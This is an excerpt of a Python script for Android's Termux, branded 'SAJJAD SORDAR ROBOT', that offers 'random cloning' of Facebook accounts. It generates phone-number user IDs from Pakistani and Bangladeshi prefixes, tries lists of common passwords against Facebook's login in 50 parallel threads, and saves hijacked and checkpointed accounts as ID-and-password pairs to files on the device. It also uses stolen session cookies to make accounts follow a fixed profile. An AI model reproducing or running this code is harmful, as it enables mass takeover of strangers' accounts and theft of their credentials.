...
import os
print("\033[1;94m   [] SAJJAD SORDAR (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [] SAJJAD SORDAR ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Sajjad Sordar Robot install complete"')
...
def o():
    ...
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mRANDOM CLONING   ")
    print("\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mMY FACEBOOK ACCOUNT ")
    Sajju = input('\033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect Menu \033[38;5;196m: ')
    if Sajju == '1':
        i()
    if Sajju == '2':
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://p.facebook.com/profile.php?id=100015315258519', {
...
\033[1;93m _______  _______    ______   _______  _______ 
\033[1;93m(  ____ \(  ____ \  (  ___ \ (  ____ )(  ___  )
\033[1;37m| (    \/| (    \/  | (   ) )| (    )|| (   ) |
\033[1;37m| (_____ | (_____   | (__/ / | (____)|| |   | |
\033[1;37m(_____  )(_____  )  |  __ (  |     __)| |   | |
 \033[1;37m     ) |      ) |  | (  \ \ | (\ (   | |   | |
\033[1;93m/\____) |/\____) |  | )___) )| ) \ \__| (___) |
\033[1;93m\_______)\_______)  |/ \___/ |/   \__/(_______)
\33[m\033[1;91m\033[1;41m\033[1;97m********************[SAJJAD]*******************\033[;0m\033[1;91m\033[1;92m
\033[1;94m[]AUTHOR   :\033[1;37m SAJJAD-SORDAR 
\033[1;36m[]GITHUB   : \033[1;37mSAJJAD-SORDAR 
\033[1;95m[]WHATSAPP : \033[1;37mRECENTLY OFF 
\033[1;96m[]TOOLS    : \033[1;37mRENDOM CLONING   
\033[1;92m[]VERSION  : \033[1;91m4K \033[1;93mPREMIUM
\33[m\033[1;91m\033[1;41m\033[1;97m********************[SORDAR]*******************\033[;0m\033[1;91m\033[1;92m""")
...
def i():
    ...
    os.system("clear")
    print(logo)
    print("\033[1;92m[SS]\033[1;95mCLONING \033[97;1m[\033[92;1mENJOY\033[97;1m]")
    print("\33[m\033[1;95m\033[1;41m\033[1;97m***********************************************\033[;0m\033[1;95m\033[1;92m")
    print("\033[97;1m[\033[92;1m\033[97;1m]\033[38;5;46mPK CODE    \033[38;5;196m:\033[1;97m 301 302 303 305")
    print("\33[m\033[1;94m\033[1;94m\033[1;94m***********************************************\033[;0m\033[1;94m\033[1;94m")
    print("\033[97;1m[\033[92;1m\033[97;1m]\033[38;5;46mBD CODE    \033[38;5;196m:\033[1;97m 016 017 018 019")
    print("\33[m\033[1;92m\033[1;41m\033[1;97m***********************************************\033[;0m\033[1;92m\033[1;92m")
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        jalan("\33[m\033[1;96m\033[1;96m\033[1;96m***********************************************\033[;0m\033[1;96m\033[1;96m")
        for love in user:
            pwx = [love,'bangladesh','iloveyou', 'sadiya', 'Samiya','FreeFire', 'kingdom','cutegirl', 'bdking']
            uid = code+love
...
def rcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[-OK[🫂] ' +uid+ '|' +ps+    '  \n ')                
                open('/sdcard/SAJJAD-SORDAR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;193m[-CP[💩] ' +uid+ '|' +ps+ '  \33[0;94m')
                open('/sdcard/SAJJAD-SORDAR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[1;93mSAJJAD-SORDAR-\033[0m%s\33[1;93m\033[1;97m-OK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
